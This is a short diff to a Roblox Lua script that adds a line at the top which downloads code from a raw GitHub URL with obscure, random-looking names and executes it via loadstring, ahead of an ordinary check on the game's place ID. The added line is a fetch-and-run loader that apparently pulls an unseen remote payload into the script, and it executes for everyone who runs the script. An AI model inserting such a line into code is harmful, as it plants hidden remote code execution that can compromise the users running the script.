@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Aoodnfnekskdof/Oaodjfnaoaooc/refs/heads/main/duhfgkdfkjg"))()
+
 local targetGameId = 6708206173
 
 if game.PlaceId == targetGameId then
